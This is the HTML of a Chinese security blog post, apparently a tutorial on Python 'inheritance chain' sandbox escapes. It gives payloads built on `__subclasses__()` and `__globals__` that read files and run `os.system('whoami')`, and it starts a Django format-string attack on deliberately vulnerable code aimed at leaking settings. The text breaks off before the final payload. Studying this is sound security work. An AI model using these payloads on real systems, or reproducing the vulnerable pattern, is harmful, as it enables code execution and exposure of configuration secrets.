@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如().__class__.__bases__[0].__subclasses__()的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用python继承链搞事情">
+<meta property="og:url" content="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如().__class__.__bases__[0].__subclasses__()的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/pic.png">
+<meta property="article:published_time" content="2018-04-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T12:44:18.022Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/pic.png">
+
+<link rel="canonical" href="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>用python继承链搞事情 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          用python继承链搞事情
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-04-24 00:00:00" itemprop="dateCreated datePublished" datetime="2018-04-24T00:00:00+08:00">2018-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 20:44:18" itemprop="dateModified" datetime="2019-12-21T20:44:18+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>6 mins.</span>
+            </span>
+            <div class="post-description">继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如().__class__.__bases__[0].__subclasses__()的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如<code>().__class__.__bases__[0].__subclasses__()</code>的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h2><p>返回一个类直接所继承的类（元组形式）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base2</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base1, Base2)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span><span class="params">(test)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> test.__bases__</span><br><span class="line"><span class="keyword">print</span> test2.__bases__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class __main__.Base1 at 0x0322ADF8&gt;, &lt;class __main__.Base2 at 0x0322AE30&gt;)</span></span><br><span class="line"><span class="string">(&lt;class __main__.test at 0x0322AE68&gt;,)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<p>在看别人文章时发现<strong>mro</strong>和<strong>bases</strong>用法相同，两者具体区别， 暂时留个坑。</p>
+<p>一些情况下也可用<code>__base__</code>直接返回单个的类</p>
+<h2 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">obj = Base()</span><br><span class="line"><span class="keyword">print</span> obj.__class__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">__main__.Base</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<p>返回一个实例所属的类</p>
+<h2 id="globals"><a href="#globals" class="headerlink" title="globals"></a><strong>globals</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> test.__init__.__globals__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&#123;'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'backup.py', '__package__': None, 'fun': &lt;function fun at 0x7f542e44b5f0&gt;, 'test': &lt;class __main__.test at 0x7f542e43b598&gt;, 'var': 2333, '__name__': '__main__', 'os': &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;, '__doc__': None&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<p>使用方式是 <code>函数名.__globals__</code>，返回一个当前空间下能使用的模块，方法和变量的字典。</p>
+<p><a href="https://www.notion.so/61202a69e4ee434099d89b4576fc0ee5" target="_blank" rel="noopener">Untitled</a></p>
+<h2 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h2><p>获取一个类的子类，返回的是一个列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base1)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> Base1.__subclasses__()</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[&lt;class '__main__.test'&gt;]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="builtin-amp-amp-builtins"><a href="#builtin-amp-amp-builtins" class="headerlink" title="builtin &amp;&amp; builtins"></a><strong>builtin</strong> &amp;&amp; <strong>builtins</strong></h2><p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在<code>__builtins__</code>中可以查到。查看的方法是<code>dir(__builtins__)</code>。在控制台中直接输入<code>__builtins__</code>会看到如下情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#python2</span><br><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &#39;__builtin__&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>ps：在py3中<code>__builtin__</code>被换成了<code>builtin</code></em></p>
+<p><code>__builtin__</code> 和 <code>__builtins__</code>之间是什么关系呢？</p>
+<p>1、在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p>
+<p>2、非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p>
+<h1 id="继承链bypass沙盒"><a href="#继承链bypass沙盒" class="headerlink" title="继承链bypass沙盒"></a>继承链bypass沙盒</h1><h2 id="用file对象读取文件"><a href="#用file对象读取文件" class="headerlink" title="用file对象读取文件"></a>用file对象读取文件</h2><p>构造继承链的一种思路是：</p>
+<ol>
+<li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li>
+<li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li>
+<li>用<code>__subclasses__()</code>拿到子类列表</li>
+<li>在子类列表中直接寻找可以利用的类</li>
+</ol>
+<p>一言敝之</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到列表里面有一坨，这里只看file对象。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[...,&lt;type &#39;file&#39;&gt;, ...]</span><br></pre></td></tr></table></figure>
+
+<p>查找<code>file</code>位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'file'</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;type &#39;file&#39;&gt;</code>在第40位。<code>().__class__.__bases__[0].__subclasses__()[40]</code></p>
+<p>用<code>dir</code>来看看内置的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>所以最终的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()</span><br></pre></td></tr></table></figure>
+
+<p>然后用同样的手法可以得到<code>__mro__</code>形式下的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</span><br></pre></td></tr></table></figure>
+
+<p>这种方法等价于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&#39;backup.py&#39;).readlines()</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是python3已经移除了file。所以第一种方法只能在py2中用。</strong></p>
+<h2 id="用内置模块执行命令"><a href="#用内置模块执行命令" class="headerlink" title="用内置模块执行命令"></a>用内置模块执行命令</h2><p>第二种方法接着第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），万一有<code>os</code>这种东西就赚了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'os'</span>	<span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 77)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>不过很可惜上述的方法也只能在py2中使用。</strong></p>
+<h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2><p>那有没有通吃py2和py3的方法呢？答案是有的，就用上面<code>__builtins__</code>来搞事。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&lt;class '_frozen_importlib._ModuleLock'&gt; 64</span></span><br><span class="line"><span class="string">#省略一堆</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<p>于是乎</p>
+<p>py3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>py2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="继承链读django配置信息"><a href="#继承链读django配置信息" class="headerlink" title="继承链读django配置信息"></a>继承链读django配置信息</h1><p>p师傅的<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django" target="_blank" rel="noopener">利用格式化字符串漏洞泄露Django配置信息</a>一文中给了两个payload都是无登陆情况下读到django配置信息，我们可以用上面所述方法找到更多的payload。</p>
+<p>测试代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(request)</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;user&#125;, This is your search: '</span> + request.GET.get(<span class="string">'keyword'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
+
+<p>因为是无登陆情况，所以requests.User里面的对象是<code>AnonymousUser</code>的实例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnonymousUser</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment">#省略</span></span><br><span class="line">    _groups = EmptyManager(Group)</span><br><span class="line">    _user_permissions = EmptyManager(Permission)</span><br></pre></td></tr></table></figure>
+
+<p>观察到<code>_groups</code>属性是一个<code>EmptyManager</code>对象。</p>
+<p>跟踪<code>EmptyManager</code>来到manger.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">from</span> django.db.models.query <span class="keyword">import</span> QuerySet</span><br><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmptyManager</span><span class="params">(Manager)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model)</span>:</span></span><br><span class="line">        super(EmptyManager, self).__init__()</span><br><span class="line">        self.model = model</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_queryset</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> super(EmptyManager, self).get_queryset().none(</span><br></pre></td></tr></table></figure>
+
+<p>跟踪<code>QuerySet</code>来到query.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuerySet</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Represents a lazy database lookup for a set of objects.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model=None, query=None, using=None, hints=None)</span>:</span></span><br></pre></td></tr></table></figure>
+
+<p><code>settings</code>里面就是django的配置了。</p>
+<p>将上面的跟踪一步一步转换成payload就是</p>
